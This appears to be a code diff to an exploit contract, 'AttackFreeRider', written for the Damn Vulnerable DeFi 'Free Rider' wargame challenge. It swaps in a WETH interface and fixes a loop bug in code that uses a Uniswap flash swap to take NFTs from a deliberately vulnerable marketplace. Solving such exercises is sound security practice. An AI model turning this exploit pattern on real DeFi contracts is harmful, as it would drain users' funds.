@@ -1,11 +1,19 @@
 // SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.0;
-
-import "../WETH9.sol";
 import "../DamnValuableNFT.sol";
 import "./FreeRiderNFTMarketplace.sol";
 import "./FreeRiderBuyer.sol";
+
+interface IWETH9 {
+    function withdraw(uint256 amount0) external;
+
+    function deposit() external payable;
+
+    function transfer(address dst, uint256 wad) external returns (bool);
+
+    function balanceOf(address addr) external returns (uint256);
+}
 
 interface IUniswapV2Pair {
     function swap(
@@ -17,7 +25,7 @@ interface IUniswapV2Pair {
 }
 
 contract AttackFreeRider {
-    WETH9 private weth;
+    IWETH9 private weth;
     DamnValuableNFT private dvNFT;
 
     IUniswapV2Pair private uniswapPair;
@@ -31,7 +39,7 @@ contract AttackFreeRider {
         address _nftMarketPlate,
         address _nftBuyer
     ) {
-        weth = WETH9(_weth);
+        weth = IWETH9(_weth);
         dvNFT = DamnValuableNFT(_dvNFT);
         uniswapPair = IUniswapV2Pair(_uniswapPair);
         nftMarketPlate = FreeRiderNFTMarketplace(_nftMarketPlate);
@@ -57,7 +65,7 @@ contract AttackFreeRider {
         uniswapPair.swap(_amount, 0, address(this), new bytes(1));
 
         //After flash swap, transfer NFTs to buyer
-        for (uint256 tokenId = 0; tokenId < 6; i++) {
+        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
             dvNFT.safeTransferFrom(address(this), address(nftBuyer), tokenId);
         }
     }
